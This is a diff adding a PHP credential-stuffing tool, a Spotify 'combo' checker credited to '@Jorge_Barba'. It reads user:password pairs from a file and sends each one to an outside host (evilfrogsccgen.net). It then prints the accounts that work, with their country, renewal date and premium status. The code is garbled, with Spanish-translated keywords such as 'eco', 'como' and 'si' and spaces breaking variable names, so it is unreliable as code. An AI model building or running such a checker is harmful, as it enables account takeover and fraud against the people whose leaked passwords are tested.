@@ -1,0 +1,63 @@
+<? php 
+error_reporting ( 0 )
+echo  " \ 033 [01; 33m
+────╔══╗─────╔╗───────╔╗──
+────║╔╗║────╔╝╚╗──────║║──
+╔══╗║╚╝║╔══╗╚╗╔╝╔╗╔══╗║║╔╗
+║══╣║╔═╝║╔╗║─║║──╣║╔═╝║╚╝╝
+─══║║║──║╚╝║─║╚╗║║║╚═╗║╔╗╗
+╚══╝╚╝──╚══╝─╚═╝╚╝╚══╝╚╝╚╝ \ 033 [0m \ 033 [01; 31m
+               
+                                
+   
+#BY @Jorge_Barba \ 033 [0m \ n " ;
+$ ruta  =  readline ( " Combo: " );
+eco 
+" \ 033 [01; 32m∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = = = = = = = = = = = = = = = ∞ \ 033 [0m \ n " ;
+echo  " \ 033 [00; 35mSolo saldran cuentas
+Funcional, espere con calma. \ 033 [0m \ n " ;
+eco 
+" \ 033 [01; 32m∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = ∞ = = = = = = = = = = = = = = = ∞ \ 033 [0m \ n " ;
+$ oa  =  fopen ( $ ruta , ' r ' );
+while ( $ a  =  fgetcsv ( $ oa , 1000 , ' : ' )) {
+	$ spotify  =  curl_init ();
+	curl_setopt ( $ spotify ,
+CURLOPT_URL , " http://www.evilfrogsccgen.net/spotify/api/?u= $ a [ 0 ] & p = $ a [ 1 ] " );
+	curl_setopt ( $ spotify , CURLOPT_RETURNTRANSFER , 1 
+);
+	$ info = curl_exec ( $ spotify );
+	curl_close ( $ spotify );
+	if ( strpos ( $ info , ' none ' ) ! == false ) {
+	$ info = ( json_decode ( $ info , true ));
+	$ i = 0 ;
+	foreach ( $ info  como  $ clave  =>  $ valor ) {
+	if ( $ clave == " Validuntil " || $ clave == " País " ) {
+		if ( $ clave == " Validuntil " ) {
+                                $ clave = " renueva: " ;
+		}
+		if ( $ clave == " País " ) {                                                      
+ $ clave = " País: " ;
+		};
+		$ i ++ ;
+		si ( $ i == 1 ) {
+	echo  " \ 033 [00; 36mCuenta: $ a [ 0 ]: $ a [ 1 ] | \ 033 [0m \ n " ;
+		}
+		
+if ( $ clave == " renueva: " || $ clave == " Pais: " ) {
+			foreach ( $ valor  como  $ clave2 
+=> $ valor2 ) {
+	echo  " \ 033 [00; 36m $ clave  $ valor2 | \ 033 [0m " ;			
+}
+			si ( $ i == 2 ) {
+		echo  " \ 033 [01; 32mPREMIUM \ 033 [0m \ n " ;			
+}	
+		}
+	}
+	
+	}
+	
+	} else {	
+	}
+	
+}
+	fclose ( $ oa ); ? >
